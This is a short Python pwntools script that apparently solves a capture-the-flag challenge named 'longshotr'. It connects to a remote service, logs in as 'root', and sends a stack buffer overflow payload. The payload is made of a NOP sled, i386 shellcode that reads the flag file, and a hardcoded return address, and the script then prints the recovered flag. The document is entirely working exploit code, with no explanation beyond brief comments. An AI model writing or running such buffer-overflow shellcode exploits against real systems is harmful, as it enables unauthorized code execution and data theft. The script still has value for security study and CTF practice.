from pwn import *
from sys import argv
import time

def longshotr(IPaddr, port):
    #taking away unnecessary print from pwntools
    context.log_level = "error"
    #connect to longshotr
    r = remote(IPaddr, int(port))
    #info: -8112h = 33042
    buffer_len = 33042
    #craft shell with command cat flag
    catflag = shellcraft.i386.linux.cat('flag')
    shellcode = asm(catflag)

    nop = pwnlib.shellcraft.amd64.nop()
    asmnop = asm(nop)

    shellcode_len = len(shellcode)
    nopsled = asmnop * (buffer_len - shellcode_len + 4)
    ret_addr = "\x20\xa4\x04\x08"

    username = "root\0"

    r.send(username+ '\n')
    #r.send(payload + '\n')
    data2 = r.recvuntil("analyzed:")
    #print data2
    r.sendline(nopsled + shellcode + ret_addr + '\n')
    output = r.recvall()
    if "FLAG" in output:
        pos = output.find("FLAG")
        print output[pos:]

longshotr(argv[1],argv[2])
